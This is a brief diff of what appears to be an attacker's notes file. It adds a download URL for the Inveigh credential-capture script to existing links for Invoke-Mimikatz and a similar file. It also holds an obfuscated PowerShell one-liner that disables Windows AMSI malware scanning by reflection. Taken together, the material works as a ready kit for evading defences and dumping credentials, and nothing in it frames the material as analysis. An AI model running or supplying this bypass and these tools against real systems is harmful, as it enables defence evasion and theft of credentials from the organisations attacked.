@@ -22,6 +22,8 @@ https://github.com/vinicius-batistella/Rumo/raw/refs/heads/main/catz.txt
 
 https://github.com/vinicius-batistella/Rumo/raw/refs/heads/main/Invoke-Mimikatz.ps1
 
+https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/refs/heads/master/Inveigh.ps1
+
 ==============================================================================================================================
 
 [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
